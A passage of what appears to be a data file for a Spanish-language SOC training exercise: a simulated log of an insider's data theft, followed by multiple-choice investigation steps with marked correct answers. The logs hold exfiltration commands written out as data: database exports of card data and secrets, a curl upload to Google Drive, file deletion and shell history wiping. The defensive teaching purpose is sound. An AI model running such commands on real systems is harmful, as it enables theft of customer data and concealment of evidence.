      { line: 17, timestamp: "Aug 24 17:16:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'COPY (SELECT o.order_id, o.customer_id, c.name, c.email, c.credit_card_last4, o.amount FROM orders o JOIN customers c ON o.customer_id=c.customer_id WHERE o.year=2026) TO '/tmp/orders_export.csv' WITH CSV HEADER'", severity: "critical", flagged: true },
      { line: 18, timestamp: "Aug 24 17:17:30", source: "srv-web-01 nginx.access", message: "POST /api/auth/login 200 -- 10.10.2.44 -- Lucía Fernández", severity: "info", flagged: false },
      { line: 19, timestamp: "Aug 24 17:18:00", source: "srv-monitor cron", message: "Health check: srv-db-01 -- CPU 28% -- RAM 52% -- Disk 66%", severity: "info", flagged: false },
      { line: 20, timestamp: "Aug 24 17:19:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'ls -la /tmp/*.csv'", severity: "info", flagged: false },
      { line: 21, timestamp: "Aug 24 17:20:00", source: "srv-web-01 node.app", message: "Queue processor: 154 jobs completed, 18 pending", severity: "info", flagged: false },
      { line: 22, timestamp: "Aug 24 17:21:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'tar czf /tmp/customer_data_2026.tar.gz /tmp/customer_export.csv /tmp/orders_export.csv'", severity: "critical", flagged: true },
      { line: 23, timestamp: "Aug 24 17:22:00", source: "srv-web-01 sshd[22810]", message: "Accepted publickey for diego from 10.10.1.20 port 50801 ssh2", severity: "info", flagged: false },
      { line: 24, timestamp: "Aug 24 17:23:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'curl -s -F file=@/tmp/customer_data_2026.tar.gz https://drive.google.com/upload --oauth2-access-token ya29.a0AfH6SMB...'", severity: "critical", flagged: true },
      { line: 25, timestamp: "Aug 24 17:24:00", source: "srv-db-01 zeek.http", message: "POST https://drive.google.com/upload -- 10.10.2.44 -- 2.4MB upload -- Content-Type: multipart/form-data", severity: "critical", flagged: true },
      { line: 26, timestamp: "Aug 24 17:25:10", source: "srv-web-01 nginx.access", message: "GET /api/products?page=1 200 -- 10.10.3.10 -- Sofía Ramírez Ops", severity: "info", flagged: false },
      { line: 27, timestamp: "Aug 24 17:26:00", source: "srv-monitor cron", message: "Metric aggregation: 9,201 events -- avg latency 12ms", severity: "info", flagged: false },
      { line: 28, timestamp: "Aug 24 17:27:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'rm /tmp/customer_export.csv /tmp/orders_export.csv /tmp/customer_data_2026.tar.gz'", severity: "critical", flagged: true },
      { line: 29, timestamp: "Aug 24 17:28:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'SELECT * FROM payment_tokens WHERE active=true LIMIT 500'", severity: "critical", flagged: true },
      { line: 30, timestamp: "Aug 24 17:29:15", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 -- 10.10.1.15 -- Martin Gonzalez Admin", severity: "info", flagged: false },
      { line: 31, timestamp: "Aug 24 17:30:00", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'COPY (SELECT token_id, customer_id, card_number, expiry_date, cvv FROM payment_tokens WHERE active=true) TO '/tmp/tokens_export.csv' WITH CSV HEADER'", severity: "critical", flagged: true },
      { line: 32, timestamp: "Aug 24 17:31:00", source: "srv-web-01 node.app", message: "Cache hit ratio: 92.1% -- Redis memory: 301MB/512MB", severity: "info", flagged: false },
      { line: 33, timestamp: "Aug 24 17:32:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'tar czf /tmp/payment_tokens_2026.tar.gz /tmp/tokens_export.csv'", severity: "critical", flagged: true },
      { line: 34, timestamp: "Aug 24 17:33:00", source: "srv-monitor cron", message: "Health check: srv-app-01 -- CPU 38% -- RAM 56% -- Disk 70%", severity: "info", flagged: false },
      { line: 35, timestamp: "Aug 24 17:34:15", source: "srv-db-01 zeek.http", message: "POST https://drive.google.com/upload -- 10.10.2.44 -- 1.8MB upload -- Content-Type: multipart/form-data", severity: "critical", flagged: true },
      { line: 36, timestamp: "Aug 24 17:35:00", source: "srv-web-01 sshd[22820]", message: "Accepted publickey for sofia from 10.10.3.10 port 50901 ssh2", severity: "info", flagged: false },
      { line: 37, timestamp: "Aug 24 17:36:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'rm /tmp/tokens_export.csv /tmp/payment_tokens_2026.tar.gz'", severity: "critical", flagged: true },
      { line: 38, timestamp: "Aug 24 17:37:00", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.1.20 -- Diego López SOC", severity: "info", flagged: false },
      { line: 39, timestamp: "Aug 24 17:38:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'SELECT setting_value FROM system_config WHERE setting_name IN ('api_key_stripe','api_key_sendgrid','smtp_password')'", severity: "critical", flagged: true },
      { line: 40, timestamp: "Aug 24 17:39:00", source: "srv-monitor cron", message: "Health check: srv-db-01 -- CPU 18% -- RAM 48% -- Disk 65%", severity: "info", flagged: false },
      { line: 41, timestamp: "Aug 24 17:40:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'COPY (SELECT * FROM system_config WHERE setting_name IN ('api_key_stripe','api_key_sendgrid','smtp_password')) TO '/tmp/secrets_export.csv' WITH CSV HEADER'", severity: "critical", flagged: true },
      { line: 42, timestamp: "Aug 24 17:41:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 200 -- 10.10.3.22 -- Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 43, timestamp: "Aug 24 17:42:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'tar czf /tmp/secrets_2026.tar.gz /tmp/secrets_export.csv'", severity: "critical", flagged: true },
      { line: 44, timestamp: "Aug 24 17:43:00", source: "srv-db-01 zeek.http", message: "POST https://drive.google.com/upload -- 10.10.2.44 -- 0.3MB upload -- Content-Type: multipart/form-data", severity: "critical", flagged: true },
      { line: 45, timestamp: "Aug 24 17:44:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'rm /tmp/secrets_export.csv /tmp/secrets_2026.tar.gz'", severity: "critical", flagged: true },
      { line: 46, timestamp: "Aug 24 17:45:00", source: "srv-web-01 node.app", message: "Queue processor: 178 jobs completed, 25 pending", severity: "info", flagged: false },
      { line: 47, timestamp: "Aug 24 17:46:15", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/bin/bash -c 'history -c && rm /root/.bash_history'", severity: "critical", flagged: true },
      { line: 48, timestamp: "Aug 24 17:47:00", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=192.0.2.55 DST=10.10.1.10 PROTO=TCP SPT=3389 DPT=3389", severity: "info", flagged: false },
      { line: 49, timestamp: "Aug 24 17:48:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'SELECT count(*) FROM customers'", severity: "info", flagged: false },
      { line: 50, timestamp: "Aug 24 17:49:00", source: "srv-web-01 sshd[22830]", message: "Accepted publickey for carlos from 10.10.3.22 port 51001 ssh2", severity: "info", flagged: false },
      { line: 51, timestamp: "Aug 24 17:50:15", source: "srv-monitor cron", message: "DLP alert: 3 files uploaded to personal cloud storage from srv-db-01 -- total 4.5MB -- user: lucia", severity: "critical", flagged: true },
      { line: 52, timestamp: "Aug 24 17:51:00", source: "srv-db-01 zeek.http", message: "GET https://drive.google.com/drive/my-drive -- 10.10.2.44 -- 200 OK", severity: "warning", flagged: true },
      { line: 53, timestamp: "Aug 24 17:52:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=/usr/bin/psql -U app_user production_db -c 'DROP TABLE temp_export'", severity: "info", flagged: false },
      { line: 54, timestamp: "Aug 24 18:45:00", source: "srv-monitor alert", message: "DLP violation confirmed: Lucía Fernández uploaded customer PII + payment tokens + API secrets to personal Google Drive (3 uploads totaling 4.5MB)", severity: "critical", flagged: true },
      { line: 55, timestamp: "Aug 24 18:45:30", source: "srv-db-01 audit.log", message: "EXECVE: uid=1002(lucia) cmd=exit", severity: "info", flagged: false },
    ],
    playbook: [],
    steps: [
      {
        id: "identify",
        title: "Paso 1 -- Identificar los logs relevantes",
        description: "Revisá el log completo. ¿Qué líneas son parte de la amenaza interna?",
        hint: "Mirá las queries SQL, las subidas a Google Drive, y la eliminación de evidencia.",
        options: [
          {
            id: "a",
            label: "Solo las líneas 24, 35, 44 (las subidas a Google Drive)",
            correct: false,
            explanation: "Las subidas son solo la exfiltración final. Necesitás ver las queries SQL que extrajeron los datos, las compresiones, y la eliminación de evidencia para entender el alcance completo.",
            consequence: "En un SOC real, reportar solo las subidas sin ver qué datos específicos se robaron hace que el equipo no dimensione la gravedad: no sabrán si se robaron 100 o 100,000 registros de clientes.",
          },
          {
            id: "b",
            label: "Líneas 12-13, 15, 17, 22, 24-25, 28-31, 33, 35, 37, 39, 41, 43-45, 47, 51-54 (cadena completa)",
            correct: true,
            explanation: "Correcto. La secuencia es: queries SQL de extracción (SELECT de customers, orders, payment_tokens, secrets) -> export a CSV -> compresión -> subida a Google Drive -> eliminación de archivos -> limpieza de historial. Todo es parte del mismo incidente.",
          },
          {
            id: "c",
            label: "Todas las líneas del log (1-55)",
            correct: false,
            explanation: "Las líneas normales incluyen health checks, activity de otros usuarios, y tráfico legítimo. No son parte de la amenaza interna. Incluir todo dificulta el análisis forense.",
            consequence: "En un SOC real, entregar 55 líneas de 'evidencia' donde 30 son tráfico legítimo hace que el equipo de contención pierda horas investigando usuarios inocentes mientras la exfiltración sigue activa.",
          },
          {
            id: "d",
            label: "Solo la línea 54 (la alerta DLP final)",
            correct: false,
            explanation: "La alerta DLP es el resultado final, pero necesitás ver todo el proceso: qué queries se ejecutaron, qué datos se extrajeron, cómo se subieron, y qué evidencia se eliminó.",
            consequence: "En un SOC real, reportar solo la alerta DLP sin la evidencia de las queries SQL hace que el equipo no pueda determinar qué datos específicos fueron comprometidos, lo cual es crítico para la notificación regulatoria.",
          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 -- Asignar el incidente",
        description: "¿Quién debería tomar este caso? Una empleada está exfiltrando datos de clientes.",
        hint: "Considerá que esto es amenaza interna con exfiltración de datos regulatorios.",
        options: [
          {
            id: "a",
            label: "Lucía Fernández -- que ella misma investigue su activity",
            correct: false,
            explanation: "Lucía es la sospechosa. Darle acceso a la investigación es como darle al ladrón las cámaras de seguridad. Ella podría borrar más evidencia o alertar a cómplices.",
            consequence: "En un SOC real, involucrar a la persona sospechosa en la investigación permite que destruya evidencia, alerte a otros involucrados, o altere registros para cubrir sus huellas.",
          },
          {
            id: "b",
            label: "Diego López (SOC L2) + Ana Martínez (DevOps) + escalamiento a CISO y Legal por amenaza interna",
            correct: true,
            explanation: "Correcto. Amenaza interna con exfiltración de datos de clientes requiere: investigación (Diego), contención técnica (Ana -- desactivar cuenta, revocar access), y escalamiento inmediato a CISO y Legal por implicaciones regulatorias.",
          },
          {
            id: "c",
            label: "Martín González (SysAdmin) -- que revise los permisos de Lucía en la DB",
            correct: false,
            explanation: "Revisar permisos es importante, pero es una acción de remediación, no de contención inmediata. La cuenta de Lucía sigue activa y podría seguir exfiltrando datos mientras se revisan los permisos.",
            consequence: "En un SOC real, revisar permisos mientras la exfiltración sigue activa es como cerrar la puerta del establo después de que se escaparon los caballos.",
          },
          {
            id: "d",
            label: "Sofía Ramírez (Gerente de Operaciones) -- que decida si Lucía debe ser despedida",
            correct: false,
            explanation: "La decisión de despido es una acción de RRHH, no de contención de seguridad. Primero se contiene el incidente, se preserva la evidencia, y luego RRHH toma decisiones administrativas.",
            consequence: "En un SOC real, priorizar decisiones de RRHH sobre la contención de seguridad permite que la exfiltración continúe mientras se debate el futuro laboral del sospechoso.",
          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 -- Consultar el playbook",
        description: "El playbook está vacío. ¿Cuál es la PRIMERA acción de contención para una amenaza interna con exfiltración activa?",
        hint: "Pensá en cortar el acceso de la persona mientras preservas la evidencia.",
        options: [
          {
            id: "a",
            label: "Hablar con Lucía para entender por qué está subiendo archivos",
            correct: false,
            explanation: "Confrontar al sospechoso sin contención previa permite que destruya evidencia, alerte a cómplices, o continúe la exfiltración mientras 'explica' su situación.",
            consequence: "En un SOC real, confrontar a un insider sin contención previa es el error más común. El sospechoso puede borrar logs, destruir evidencia, o subir más datos mientras 'conversás'.",
          },
          {
            id: "b",
            label: "Desactivar la cuenta de Lucía, revocar acceso SSH a srv-db-01, bloquear subidas a Google Drive desde la red corporativa, y preservar evidencia forense",
            correct: true,
            explanation: "Correcto. La contención de amenaza interna requiere: 1) desactivar cuenta para cortar acceso, 2) revocar SSH, 3) bloquear exfiltración a cloud, 4) preservar logs como evidencia. En ese orden.",
          },
          {
            id: "c",
            label: "Apagar srv-db-01 para detener la exfiltración",
            correct: false,
            explanation: "Apagar la base de datos de producción causa downtime en todos los servicios que dependen de ella. La exfiltración se corta desactivando la cuenta de Lucía, no apagando el servidor.",
            consequence: "En un SOC real, apagar un servidor de base de datos en producción causa caídas en todos los servicios de la empresa. La contención debe ser quirúrgica, no drástica.",
          },
          {
            id: "d",
            label: "Borrar los archivos que Lucía subió a Google Drive",
            correct: false,
            explanation: "No puedes borrar archivos de Google Drive personal de Lucía sin acceso legal. Además, borrar evidencia puede interferir con la investigación legal. La prioridad es contener, no borrar.",
            consequence: "En un SOC real, intentar borrar datos de la nube personal del sospechoso sin autorización legal puede ser ilegal y destruir evidencia necesaria para un caso penal.",
          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 -- Clasificar la alerta",
        description: "¿Cuál es la clasificación correcta de este incidente?",
        hint: "Considerá: extracción intencional de datos, subida a cloud personal, eliminación de evidencia.",
        options: [
          {
            id: "a",
            label: "Falso positivo -- Lucía probablemente está haciendo una copia de seguridad legítima",
            correct: false,
            explanation: "Copias de seguridad legítimas se hacen a destinos corporativos autorizados, no a Google Drive personal. Además, Lucía extrajo datos de clientes y tokens de pago que no son parte de su trabajo de desarrollo.",
            consequence: "En un SOC real, clasificar exfiltración intencional a Google Drive personal como 'copia de seguridad' ignora que hay datos de clientes comprometidos que requieren notificación regulatoria.",
          },
          {
            id: "b",
            label: "Positivo verdadero -- Amenaza interna con exfiltración intencional de datos de clientes",
            correct: true,
            explanation: "Correcto. La evidencia es clara: extracción selectiva de datos sensibles (customers, payment_tokens, API secrets) + subida a Google Drive personal + eliminación de archivos + limpieza de historial. Esto es exfiltración intencional.",
          },
          {
            id: "c",
            label: "Requiere investigación -- puede ser un error de configuración",
            correct: false,
            explanation: "Un error de configuración no ejecuta queries SQL SELECT específicas, no comprime archivos, no los sube a Google Drive, y no elimina evidencia. Cada paso fue intencional y deliberado.",
            consequence: "En un SOC real, clasificar exfiltración intencional como \'error de configuración\' retrasa la notificación regulatoria y permite que el sospechoso siga operando libremente.",
          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 -- Redacción del reporte",
        description: "Escribí el reporte del incidente. Este es un caso de amenaza interna con implicaciones legales.",
        hint: "Incluí: quién, qué datos, cómo, cuánto, y acciones ejecutadas.",
        options: [
          {
            id: "a",
            label: "Una empleada subió archivos a su nube personal. Hay que revisar el policy.",
            correct: false,
            explanation: "Demasiado vago. No menciona qué datos específicos se robaron, cuántos registros, qué servidores, ni las acciones de contención ejecutadas.",
            consequence: "En un SOC real, un reporte así no permite a Legal determinar si hay obligación de notificación regulatoria. Sin saber qué datos se robaron, no puedes notificar a los clientes afectados.",
          },
          {
            id: "b",
            label: "Amenaza interna confirmada -- Lucía Fernández (Desarrolladora Backend, 10.10.2.44) extrajo datos de clientes de production_db (srv-db-01) entre 17:00-17:50 UTC. Datos extraídos: customers (customer_id, name, email, phone, credit_card_last4, address), orders (order_id, amount, payment_method, card_number), payment_tokens (token_id, card_number, expiry_date, cvv), y system secrets (api_key_stripe, api_key_sendgrid). Total: ~4.5MB subidos a Google Drive personal en 3 uploads. Evidencia de eliminación de archivos y limpieza de historial. Cuenta desactivada, SSH revocado, DLP actualizado. Impacto: datos de clientes de pagos comprometidos -- notificación regulatoria requerida.",
            correct: true,
            explanation: "Reporte completo de amenaza interna: QUIÉN (Lucía), QUÉ DATOS (customers, orders, payment_tokens, secrets), CÓMO (psql queries + curl a Google Drive), CUÁNDO (17:00-17:50), CUÁNTO (4.5MB), EVIDENCIA DE DESTRUCCIÓN (rm + history -c), CONTENCIÓN, e IMPACTO REGULATORIO. Formato profesional SOC.",
          },
          {
            id: "c",
            label: "Lucía robó datos. Hay que despedirla y cambiar todas las contraseñas.",
            correct: false,
            explanation: "Lenguaje informal sin datos técnicos. 'Cambiar todas las contraseñas' no es una acción de contención. No hay IP, timestamp, datos específicos, ni plan de notificación regulatoria.",
            consequence: "En un SOC real, un reporte sin datos específicos impide la notificación regulatoria a clientes cuyos datos de tarjetas de crédito fueron comprometidos.",
          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 -- Volver al panel",
        description: "Incidente documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
        hint: "Pensá en amenaza interna con implicaciones legales y regulatorias.",
        options: [
          {
            id: "a",
            label: "Cerrar el caso -- ya está todo documentado",
            correct: false,
            explanation: "Un caso de amenaza interna con datos de clientes comprometidos no se cierra sin: verificación de que la cuenta fue desactivada, preservación de evidencia forense, notificación a Legal, y coordinación con DPO para notificación regulatoria.",
            consequence: "En un SOC real, cerrar un caso de amenaza interna sin verificar la preservación de evidencia puede arruinar un caso legal contra el empleado y exponer a la empresa a multas regulatorias.",
          },
          {
            id: "b",
            label: "Volver al panel de logs para monitorear si hay más activity sospechosa de otros empleados mientras Legal y DPO ejecutan sus protocolos",
            correct: true,
            explanation: "Correcto. Tu rol es vigilancia continua: ¿hay otros empleados exfiltrando datos? ¿el atacante tiene cómplices? ¿hay más exfiltración en curso? Mientras Legal ejecuta, vos monitoreás.",
          },
          {
            id: "c",
            label: "Ir a revisar la workstation de Lucía físicamente",
            correct: false,
            explanation: "Como SOC analyst, no deberías manipular evidencia físicamente. Eso es trabajo del equipo forense y Legal. Tu rol es análisis de logs, clasificación, y monitoreo continuo.",
            consequence: "En un SOC real, tocar la workstation sin protocolo forense y sin presencia de RRHH puede comprometer la cadena de custodia y hacer inadmisible la evidencia en un caso legal.",
          },
        ],
      },
    ],
    summary: "Amenaza interna confirmada -- Lucía Fernández extrajo datos de clientes de production_db (customers, orders, payment_tokens, API secrets) y los subió a Google Drive personal. ~4.5MB de datos sensibles exfiltrados entre 17:00-17:50 UTC. Evidencia de eliminación de archivos y limpieza de historial. Clasificación: POSITIVO VERDADERO -- Exfiltración intencional de datos con implicaciones regulatorias.",
  },
];
